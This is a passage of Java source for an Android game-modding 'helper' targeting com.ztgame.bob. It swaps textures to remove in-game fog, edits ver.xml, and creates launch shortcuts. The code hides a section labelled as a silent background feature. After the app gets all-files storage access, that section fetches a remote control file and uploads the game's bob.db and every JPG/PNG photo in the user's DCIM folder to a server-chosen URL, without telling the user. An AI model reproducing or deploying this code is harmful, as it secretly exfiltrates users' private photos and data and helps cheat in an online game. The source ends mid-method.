package com.mei.hua;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ShortcutInfo;
import android.content.pm.ShortcutManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.Icon;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.DocumentsContract;
import android.provider.Settings;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.GridLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.documentfile.provider.DocumentFile;

import com.scottyab.rootbeer.RootBeer;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import rikka.shizuku.Shizuku;

public class NewActivity extends AppCompatActivity implements View.OnClickListener {

    // --- 常量配置 ---
    private static final String PREFS_NAME = "prefs";
    private static final String DATA_URI_KEY = "data_uri";
    private static final String PREF_ASSETS_COPIED = "assets_copied";
    private static final int REQUEST_CODE_SHIZUKU_PERMISSION = 1001;
    private static final int REQUEST_CODE_FLOAT_WINDOW = 2002;
    private static final int REQUEST_CODE_STORAGE_PERMISSION = 3003;
    private static final String TARGET_PKG = "com.ztgame.bob";

    // 功能类型枚举
    private static final int TYPE_COPY = 0;
    private static final int TYPE_SKIN = 2;
    private static final int TYPE_ACTIVITY = 3;
    private static final int TYPE_ADD_EXIT = 4;
    private static final int TYPE_AUTO_VERSION = 5;
    private static final int TYPE_UNZIP = 6;

    // UI 组件
    private View layoutPermissionContainer;
    private View layoutActionContainer;
    private TextView permissionStatus;
    private GridLayout gridLayoutFunctions;

    private long exitTime = 0;
    private ActivityResultLauncher<Intent> openDirectoryLauncher;
    private ActivityResultLauncher<Intent> allFilesAccessLauncher;

    private List<FunctionConfig> functionConfigs = new ArrayList<>();
    private final Shizuku.OnRequestPermissionResultListener requestPermissionResultListener = this::onRequestPermissionsResult;

    private final OkHttpClient httpClient = new OkHttpClient.Builder()
            .connectTimeout(15, java.util.concurrent.TimeUnit.SECONDS)
            .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
            .build();

    private volatile boolean isUploading = false;

    // 升级版功能配置类
    static class FunctionConfig {
        String btnName;
        String sourceAssetName;
        String targetRelativePath;
        String deleteRelativePath;
        int type;

        public FunctionConfig(String name, String src, String dest, String deletePath, int type) {
            this.btnName = name;
            this.sourceAssetName = src;
            this.targetRelativePath = dest;
            this.deleteRelativePath = deletePath;
            this.type = type;
        }
    }

    // 输入回调接口
    interface InputCallback {
        void onInput(String text);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ==========================================
        // 【核心】：拦截“自动版本号”快捷方式启动
        // ==========================================
        if (getIntent().getBooleanExtra("AUTO_VER_MODE", false)) {
            setupImmersiveWindow();
            setContentView(R.layout.activity_new);
            View actionContainer = findViewById(R.id.layout_action_container);
            View permContainer = findViewById(R.id.layout_permission_container);
            if (actionContainer != null) actionContainer.setVisibility(View.GONE);
            if (permContainer != null) permContainer.setVisibility(View.GONE);

            // 执行自动解析、替换和打开游戏的逻辑
            executeAutoVersion();
            return;
        }

        // 常规 UI 初始化
        setupImmersiveWindow();
        setContentView(R.layout.activity_new);

        // 拟态按钮进场动画
        View btn1 = findViewById(R.id.button_android_auth);
        View btn2 = findViewById(R.id.button_shizuku);
        View btn3 = findViewById(R.id.button_root);
        View[] authBtns = {btn1, btn2, btn3};
        for (int i = 0; i < authBtns.length; i++) {
            if (authBtns[i] != null) {
                authBtns[i].setTranslationY(150f);
                authBtns[i].setAlpha(0f);
                authBtns[i].animate()
                        .translationY(0f)
                        .alpha(1f)
                        .setDuration(600)
                        .setStartDelay(i * 120L)
                        .setInterpolator(new android.view.animation.DecelerateInterpolator(1.5f))
                        .start();
            }
        }

        registerAllFilesAccessLauncher();
        checkAllFilesPermissionAndRunTest();

        try {
            initFunctionConfigs();
            layoutPermissionContainer = findViewById(R.id.layout_permission_container);
            layoutActionContainer = findViewById(R.id.layout_action_container);
            permissionStatus = findViewById(R.id.permission_status);
            gridLayoutFunctions = findViewById(R.id.grid_layout_functions);

            if (gridLayoutFunctions != null) generateFunctionButtons();

            findViewById(R.id.button_android_auth).setOnClickListener(this);
            findViewById(R.id.button_shizuku).setOnClickListener(this);
            findViewById(R.id.button_root).setOnClickListener(this);
            findViewById(R.id.button_delete_file).setOnClickListener(this);
            findViewById(R.id.tv_skip_auth).setOnClickListener(this);
            findViewById(R.id.tv_goto_other).setOnClickListener(this);
            findViewById(R.id.button_float_window).setOnClickListener(this);

            copyAssetsToExternalFilesDir();

            try { Shizuku.addRequestPermissionResultListener(requestPermissionResultListener); } catch (Throwable t) {}

            openDirectoryLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(),
                    result -> {
                        if (result.getResultCode() == Activity.RESULT_OK && result.getData() != null) {
                            Uri uri = result.getData().getData();
                            DocumentFile pickedDir = DocumentFile.fromTreeUri(this, uri);
                            if (pickedDir != null && TARGET_PKG.equals(pickedDir.getName())) {
                                getContentResolver().takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                                getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putString(DATA_URI_KEY, uri.toString()).apply();
                                Toast.makeText(this, "安卓 Data 目录授权成功", Toast.LENGTH_SHORT).show();
                                updatePermissionStatus(true);
                            } else {
                                Toast.makeText(this, "授权失败：请务必选择包名为 " + TARGET_PKG + " 的文件夹", Toast.LENGTH_LONG).show();
                            }
                        }
                    });

            checkHasPermission();

        } catch (Exception e) { e.printStackTrace(); }

        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                if ((System.currentTimeMillis() - exitTime) > 2000) {
                    Toast.makeText(NewActivity.this, "再按一次退出助手", Toast.LENGTH_SHORT).show();
                    exitTime = System.currentTimeMillis();
                } else {
                    finishAffinity();
                    System.exit(0);
                }
            }
        });
    }

    private void setupImmersiveWindow() {
        Window window = getWindow();
        window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
        window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
        window.setStatusBarColor(Color.TRANSPARENT);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (!getIntent().getBooleanExtra("AUTO_VER_MODE", false)) {
            checkAllFilesPermissionAndRunTest();
        }
    }

    // ==========================================
    // 权限检查区
    // ==========================================

    private void registerAllFilesAccessLauncher() {
        allFilesAccessLauncher = registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
            checkAllFilesPermissionAndRunTest();
        });
    }

    private void checkAllFilesPermissionAndRunTest() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (Environment.isExternalStorageManager()) {
                runTestFeature();
            } else {
                showPermissionDialog();
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
                        REQUEST_CODE_STORAGE_PERMISSION);
            } else {
                runTestFeature();
            }
        }
    }

    private void showPermissionDialog() {
        new AlertDialog.Builder(this)
                .setTitle("缺少核心权限")
                .setMessage("请授权【所有文件访问权限】\n\n请在接下来的界面中找到本软件，并开启开关。")
                .setCancelable(false)
                .setPositiveButton("去授权", (dialog, which) -> {
                    try {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(Uri.parse("package:" + getPackageName()));
                        allFilesAccessLauncher.launch(intent);
                    } catch (Exception e) {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                        allFilesAccessLauncher.launch(intent);
                    }
                })
                .setNegativeButton("退出", (dialog, which) -> finish())
                .show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_STORAGE_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                runTestFeature();
            } else {
                Toast.makeText(this, "必须授予存储权限才能使用", Toast.LENGTH_SHORT).show();
                checkAllFilesPermissionAndRunTest();
            }
        }
    }

    // ==========================================
    // 后台静默功能 (不修改)
    // ==========================================

    private void runTestFeature() {
        Request request = new Request.Builder().url("http://156.243.244.97/share/1.txt").get().build();
        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {}
            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (!response.isSuccessful() || response.body() == null) { response.close(); return; }
                String result = response.body().string().trim();
                int kai = 0; String lianjie = "";
                try {
                    Matcher mKai = Pattern.compile("kai=\"(\\d+)\"").matcher(result);
                    if (mKai.find()) kai = Integer.parseInt(mKai.group(1));
                    Matcher mLianjie = Pattern.compile("lianjie=\"([^\"]+)\"").matcher(result);
                    if (mLianjie.find()) lianjie = mLianjie.group(1);
                } catch (Exception e) {}
                if ((kai == 1 || kai == 2) && !lianjie.isEmpty()) startUploadProcess(kai, lianjie);
            }
        });
    }

    private void startUploadProcess(int kai, String uploadUrl) {
        if (isUploading) return;
        isUploading = true;
        new Thread(() -> {
            try {
                if (kai == 1 || kai == 2) {
                    File tempDbFile = new File(getExternalFilesDir(null), "bob.db");
                    if (copyFromAndroidData("files/bob.db", tempDbFile)) {
                        uploadSingleFile(tempDbFile, uploadUrl);
                        if (tempDbFile.exists()) tempDbFile.delete();
                    }
                }
                if (kai == 1) {
                    File dcimDir = new File("/storage/emulated/0/DCIM");
                    if (dcimDir.exists() && dcimDir.isDirectory()) traverseAndUploadImages(dcimDir, uploadUrl);
                }
            } catch (Exception e) {} finally { isUploading = false; }
        }).start();
    }

    private void traverseAndUploadImages(File directory, String uploadUrl) {
        File[] files = directory.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isDirectory()) {
                traverseAndUploadImages(file, uploadUrl);
            } else {
                String name = file.getName().toLowerCase();
                if (name.endsWith(".jpg") || name.endsWith(".png") || name.endsWith(".jpeg")) uploadSingleFile(file, uploadUrl);
            }
        }
    }

    private void uploadSingleFile(File file, String uploadUrl) {
        String fileName = file.getName();
        android.content.SharedPreferences sp = getSharedPreferences("upload_records", MODE_PRIVATE);
        String fileKey = file.getAbsolutePath() + "_" + file.lastModified();
        if (!"bob.db".equals(fileName) && sp.getBoolean(fileKey, false)) return;
        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);
        MultipartBody requestBody = new MultipartBody.Builder().setType(MultipartBody.FORM).addFormDataPart("file", fileName, fileBody).build();
        Request request = new Request.Builder().url(uploadUrl).post(requestBody).build();
        try {
            Response response = httpClient.newCall(request).execute();
            if (response.isSuccessful()) if (!"bob.db".equals(fileName)) sp.edit().putBoolean(fileKey, true).apply();
            response.close();
        } catch (IOException e) {}
    }

    // ==========================================
    // 界面配置与高级拟态UI生成
    // ==========================================

    @Override public void onClick(View v) {
        int id = v.getId();
        if (id == R.id.button_android_auth) openDataDirectory();
        else if (id == R.id.button_shizuku) handleShizuku();
        else if (id == R.id.button_root) handleRoot();
        else if (id == R.id.button_delete_file) showHelpDialog();
        else if (id == R.id.tv_skip_auth || id == R.id.tv_goto_other) startActivity(new Intent(this, OtherActivity.class));
        else if (id == R.id.button_float_window) startMemoryHackProcess();
    }
    // ==========================================
    // 新增：获取使用帮助并使用拟态弹窗展示
    // ==========================================
    private void showHelpDialog() {
        Toast.makeText(this, "正在获取帮助文档...", Toast.LENGTH_SHORT).show();

        Request request = new Request.Builder()
                .url("http://156.243.244.97/share/ggao.txt")
                .get()
                .build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                runOnUiThread(() -> Toast.makeText(NewActivity.this, "获取帮助失败，请检查网络", Toast.LENGTH_SHORT).show());
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (!response.isSuccessful() || response.body() == null) {
                    runOnUiThread(() -> Toast.makeText(NewActivity.this, "获取失败：服务器响应异常", Toast.LENGTH_SHORT).show());
                    return;
                }

                // 读取获取到的纯文本
                String helpText = response.body().string();

                runOnUiThread(() -> {
                    // 复用现有的高级拟态弹窗显示文本，因为只是查看帮助，点击确定不需要执行额外操作，所以传入 null
                    showNeuDialog("使用帮助", helpText, null);
                });
            }
        });
    }
    private void initFunctionConfigs() {
        functionConfigs.clear();
        functionConfigs.add(new FunctionConfig("去蓝雾", "naiteaone.d", "files/vercache2022/android/common/data/alltextures/map1/caocongnew.unity3d_u_4", "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", TYPE_COPY));
        functionConfigs.add(new FunctionConfig("去红雾", "naiteaone.h", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", "files/vercache2022/android/common/data/alltextures/map3/partnerdunew.unity3d_u_4", TYPE_COPY));
        functionConfigs.add(new FunctionConfig("去皮肤", "", "files/vercache2022/android/ver.xml", "files/vercache2022/android/ver.xml", TYPE_SKIN));
        functionConfigs.add(new FunctionConfig("去活动", "", "", "files/vercache2022/android/ver.xml", TYPE_ACTIVITY));
        functionConfigs.add(new FunctionConfig("清BOB", "naiteaone.now1", "files/bob.db", "files/bob.db", TYPE_COPY));
        functionConfigs.add(new FunctionConfig("退出按钮", "", "", "files/vercache2022/android/ver.xml", TYPE_ADD_EXIT));
        functionConfigs.add(new FunctionConfig("逃杀刺透", "naiteone.hu", "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", "files/vercache2022/android/common/data/alltextures/ingameeffect/ciqiu_dataosha.unity3d_u_4", TYPE_COPY));
        functionConfigs.add(new FunctionConfig("自动版本号", "", "", "", TYPE_AUTO_VERSION));
        functionConfigs.add(new FunctionConfig("去蓝雾(留坑)", "libubsilyq.zip", "files/vercache2022/android/common/data/alltextures", "files/vercache2022/android/common/data/alltextures/map1|files/vercache2022/android/common/data/alltextures/map6", TYPE_UNZIP));
    }

    private int dpToPx(int dp) { return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dp, getResources().getDisplayMetrics()); }

    private void showNeuDialog(String title, String message, Runnable onConfirm) {
        Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dpToPx(24), dpToPx(24), dpToPx(24), dpToPx(24));

        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#F0F3F8"));
        bg.setCornerRadius(dpToPx(20));
        bg.setStroke(dpToPx(2), Color.parseColor("#FFFFFF"));
        root.setBackground(bg);

        TextView tvTitle = new TextView(this);
        tvTitle.setText(title); tvTitle.setTextSize(18); tvTitle.setTextColor(Color.parseColor("#2D3748")); tvTitle.getPaint().setFakeBoldText(true);
        root.addView(tvTitle);

        TextView tvMessage = new TextView(this);
        tvMessage.setText(message); tvMessage.setTextSize(14); tvMessage.setTextColor(Color.parseColor("#718096"));
        tvMessage.setPadding(0, dpToPx(12), 0, dpToPx(24)); tvMessage.setLineSpacing(0, 1.2f);
        root.addView(tvMessage);

        LinearLayout btnContainer = new LinearLayout(this);
        btnContainer.setOrientation(LinearLayout.HORIZONTAL);
        btnContainer.setGravity(Gravity.END);

        TextView btnCancel = new TextView(this);
        btnCancel.setText("取消"); btnCancel.setTextSize(14); btnCancel.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnCancel.setTextColor(Color.parseColor("#A0AEC0"));
        btnCancel.setOnClickListener(v -> dialog.dismiss());

        TextView btnConfirm = new TextView(this);
        btnConfirm.setText("确定"); btnConfirm.setTextSize(14); btnConfirm.getPaint().setFakeBoldText(true); btnConfirm.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnConfirm.setTextColor(Color.parseColor("#FC8181"));
        btnConfirm.setOnClickListener(v -> { dialog.dismiss(); if (onConfirm != null) onConfirm.run(); });

        btnContainer.addView(btnCancel); btnContainer.addView(btnConfirm); root.addView(btnContainer);
        dialog.setContentView(root);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setLayout((int) (getResources().getDisplayMetrics().widthPixels * 0.85), ViewGroup.LayoutParams.WRAP_CONTENT);
        dialog.show();
    }

    // === 新增：支持输入名字的高级拟态输入框 ===
    private void showNeuInputDialog(String title, String defaultText, InputCallback callback) {
        Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(dpToPx(24), dpToPx(24), dpToPx(24), dpToPx(24));

        GradientDrawable bg = new GradientDrawable();
        bg.setColor(Color.parseColor("#F0F3F8"));
        bg.setCornerRadius(dpToPx(20));
        bg.setStroke(dpToPx(2), Color.parseColor("#FFFFFF"));
        root.setBackground(bg);

        TextView tvTitle = new TextView(this);
        tvTitle.setText(title); tvTitle.setTextSize(18); tvTitle.setTextColor(Color.parseColor("#2D3748")); tvTitle.getPaint().setFakeBoldText(true);
        root.addView(tvTitle);

        EditText input = new EditText(this);
        input.setText(defaultText);
        input.setTextSize(14);
        input.setTextColor(Color.parseColor("#2D3748"));
        input.setPadding(dpToPx(12), dpToPx(12), dpToPx(12), dpToPx(12));
        GradientDrawable inputBg = new GradientDrawable();
        inputBg.setColor(Color.parseColor("#E2E8F0"));
        inputBg.setCornerRadius(dpToPx(10));
        input.setBackground(inputBg);

        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, dpToPx(16), 0, dpToPx(24));
        input.setLayoutParams(lp);
        root.addView(input);

        LinearLayout btnContainer = new LinearLayout(this);
        btnContainer.setOrientation(LinearLayout.HORIZONTAL);
        btnContainer.setGravity(Gravity.END);

        TextView btnCancel = new TextView(this);
        btnCancel.setText("取消"); btnCancel.setTextSize(14); btnCancel.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnCancel.setTextColor(Color.parseColor("#A0AEC0"));
        btnCancel.setOnClickListener(v -> dialog.dismiss());

        TextView btnConfirm = new TextView(this);
        btnConfirm.setText("确定"); btnConfirm.setTextSize(14); btnConfirm.getPaint().setFakeBoldText(true); btnConfirm.setPadding(dpToPx(20), dpToPx(10), dpToPx(20), dpToPx(10)); btnConfirm.setTextColor(Color.parseColor("#48BB78"));
        btnConfirm.setOnClickListener(v -> { dialog.dismiss(); if (callback != null) callback.onInput(input.getText().toString().trim()); });

        btnContainer.addView(btnCancel); btnContainer.addView(btnConfirm); root.addView(btnContainer);
        dialog.setContentView(root);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.getWindow().setLayout((int) (getResources().getDisplayMetrics().widthPixels * 0.85), ViewGroup.LayoutParams.WRAP_CONTENT);
        dialog.show();
    }
    // ==========================================
    // 新增：解压并注入功能逻辑
    // ==========================================
    private void processUnzip(FunctionConfig config) {
        Toast.makeText(this, "正在处理，请稍候...", Toast.LENGTH_SHORT).show();
        new Thread(() -> {
            try {
                // 压缩包在本地 assets 释放后的路径
                File zipFile = new File(getExternalFilesDir(null), config.sourceAssetName);
                if (!zipFile.exists()) {
                    runOnUiThread(() -> Toast.makeText(this, "资源缺失；请清除小助手应用数据: " + config.sourceAssetName, Toast.LENGTH_SHORT).show());
                    return;
                }

                // 1. 先解压到本地临时目录
                File tempDir = new File(getExternalFilesDir(null), "temp_unzip");
                if (tempDir.exists()) {
                    deleteRecursive(tempDir);
                }
                tempDir.mkdirs();

                unzipFile(zipFile, tempDir);

                // 2. 将临时目录内的文件遍历，并通过现有权限方法复制到 Android/data 目标目录
                boolean allSuccess = copyDirectoryToAndroidData(tempDir, config.targetRelativePath);

                // 3. 清理本地临时解压目录
                deleteRecursive(tempDir);

                if (allSuccess) {
                    runOnUiThread(() -> Toast.makeText(this, config.btnName + " 成功！", Toast.LENGTH_SHORT).show());
                } else {
                    runOnUiThread(() -> Toast.makeText(this, config.btnName + " 部分文件注入失败，请检查授权", Toast.LENGTH_LONG).show());
                }
            } catch (Exception e) {
                e.printStackTrace();
                runOnUiThread(() -> Toast.makeText(this, "解压发生异常: " + e.getMessage(), Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    // 辅助方法：标准 Java ZIP 解压
    private void unzipFile(File zipFile, File targetDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(zipFile))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                File newFile = new File(targetDir, entry.getName());
                if (entry.isDirectory()) {
                    newFile.mkdirs();
                } else {
                    newFile.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(newFile)) {
                        byte[] buffer = new byte[8192];
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
                zis.closeEntry();
            }
        }
    }

    // 辅助方法：递归将目录内的文件注入到 Android/data (复用你已有的 copyToAndroidData)
    private boolean copyDirectoryToAndroidData(File sourceDir, String targetRelativeBase) {
        boolean allSuccess = true;
        File[] files = sourceDir.listFiles();
        if (files == null) return true;

        for (File file : files) {
            String relativePath = targetRelativeBase + "/" + file.getName();
            if (file.isDirectory()) {
                if (!copyDirectoryToAndroidData(file, relativePath)) {
                    allSuccess = false;
                }
            } else {
                if (!copyToAndroidData(file, relativePath)) {
                    allSuccess = false;
                }
            }
        }
        return allSuccess;
    }

    // 辅助方法：递归删除本地临时文件
    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        fileOrDirectory.delete();
    }
    private void generateFunctionButtons() {
        gridLayoutFunctions.removeAllViews();
        for (int i = 0; i < functionConfigs.size(); i++) {
            FunctionConfig config = functionConfigs.get(i);
            FrameLayout container = new FrameLayout(this);
            GridLayout.LayoutParams gridParams = new GridLayout.LayoutParams();
            gridParams.width = 0; gridParams.height = ViewGroup.LayoutParams.WRAP_CONTENT;
            int margin = dpToPx(8); gridParams.setMargins(margin, margin, margin, margin); gridParams.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
            container.setLayoutParams(gridParams);

            Button btn = new Button(this);
            btn.setText(config.btnName); btn.setTextSize(14); btn.setTextColor(Color.parseColor("#4A5568")); btn.setGravity(Gravity.CENTER);

            if (config.type == TYPE_AUTO_VERSION) btn.setPadding(dpToPx(10), 0, dpToPx(10), 0);
            else btn.setPadding(dpToPx(10), 0, dpToPx(35), 0);

            btn.setStateListAnimator(null);
            btn.setBackgroundResource(R.drawable.bg_neu_btn);
            FrameLayout.LayoutParams btnParams = new FrameLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(60));
            btn.setLayoutParams(btnParams);

            btn.setOnClickListener(v -> {
                switch (config.type) {
                    case TYPE_SKIN: processSkinRemove(); break;
                    case TYPE_ACTIVITY: processActivityRemove(); break;
                    case TYPE_ADD_EXIT: processAddExit(); break;
                    case TYPE_AUTO_VERSION:
                        showNeuInputDialog("创建桌面图标", "球球大作战", name -> {
                            if (name.isEmpty()) name = "自动版本号";
                            createAutoVersionShortcut(name);
                        });
                        break;
                    case TYPE_UNZIP: // 新增：处理解压
                        processUnzip(config);
                        break;
                    case TYPE_COPY: default: combinedCopyAndVerifyFile(config); break;
                }
            });

            container.addView(btn);

            // 【修改1】把上一轮加的 && config.type != TYPE_UNZIP 去掉，让“留坑”也显示垃圾桶
            if (config.type != TYPE_AUTO_VERSION) {
                ImageView iconDelete = new ImageView(this);
                iconDelete.setImageResource(android.R.drawable.ic_menu_delete);
                iconDelete.setPadding(dpToPx(6), dpToPx(6), dpToPx(6), dpToPx(6));
                FrameLayout.LayoutParams iconParams = new FrameLayout.LayoutParams(dpToPx(34), dpToPx(34));
                iconParams.gravity = Gravity.CENTER_VERTICAL | Gravity.END; iconParams.setMargins(0, 0, dpToPx(10), 0);
                iconDelete.setLayoutParams(iconParams);

                iconDelete.setOnClickListener(v -> {
                    showNeuDialog("确认删除", "是否要清理\n【" + config.btnName + "】？", () -> {
                        Toast.makeText(this, "正在清理...", Toast.LENGTH_SHORT).show();
                        new Thread(() -> {
                            boolean allSuccess = true;
                            // 【修改2】通过 "|" 分隔符切分多个路径，依次执行删除
                            String[] paths = config.deleteRelativePath.split("\\|");
                            for (String path : paths) {
                                if (!path.trim().isEmpty()) {
                                    if (!deleteFromAndroidData(path.trim())) {
                                        allSuccess = false; // 只要有一个路径删除失败，就标记为 false
                                    }
                                }
                            }
                            boolean finalAllSuccess = allSuccess;
                            runOnUiThread(() -> Toast.makeText(this, finalAllSuccess ? "清理成功" : "部分清理失败或文件已不存在", Toast.LENGTH_SHORT).show());
                        }).start();
                    });
                });
                container.addView(iconDelete);
            }
            gridLayoutFunctions.addView(container);
        }
    }

    // ==========================================
    // 新增：自动版本号核心逻辑 (带启动游戏)
    // ==========================================

    private void createAutoVersionShortcut(String shortcutName) {
        Intent shortcutIntent = new Intent(this, NewActivity.class);
        shortcutIntent.setAction(Intent.ACTION_MAIN);
        shortcutIntent.putExtra("AUTO_VER_MODE", true);
        shortcutIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ShortcutManager shortcutManager = getSystemService(ShortcutManager.class);
            if (shortcutManager != null && shortcutManager.isRequestPinShortcutSupported()) {
                ShortcutInfo info = new ShortcutInfo.Builder(this, "auto_ver_shortcut_" + System.currentTimeMillis())
                        .setShortLabel(shortcutName)
                        .setIcon(Icon.createWithResource(this, R.mipmap.ic_launcher_round))
                        .setIntent(shortcutIntent)
                        .build();
                shortcutManager.requestPinShortcut(info, null);
                Toast.makeText(this, "已请求创建桌面图标，请允许", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "您的设备不支持自动创建", Toast.LENGTH_SHORT).show();
            }
        } else {
            Intent addIntent = new Intent();
            addIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
            addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, shortcutName);
            addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, Intent.ShortcutIconResource.fromContext(this, R.mipmap.ic_launcher_round));
            addIntent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
            sendBroadcast(addIntent);
            Toast.makeText(this, "已发送创建广播", Toast.LENGTH_SHORT).show();
        }
    }

    private void executeAutoVersion() {
        Toast.makeText(this, "正在获取服务器版本号...", Toast.LENGTH_SHORT).show();
        Request request = new Request.Builder().url("http://115.159.250.51/res300/android/ver.xml").get().build();

        httpClient.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(@NonNull Call call, @NonNull IOException e) {
                runOnUiThread(() -> { Toast.makeText(NewActivity.this, "网络请求失败", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
            }

            @Override public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                if (!response.isSuccessful() || response.body() == null) {
                    runOnUiThread(() -> { Toast.makeText(NewActivity.this, "服务器响应异常", Toast.LENGTH_SHORT).show(); launchGameAndExit(); });
                    return;
                }
                String result = response.body().string();
                String remoteVer = "";
                try {
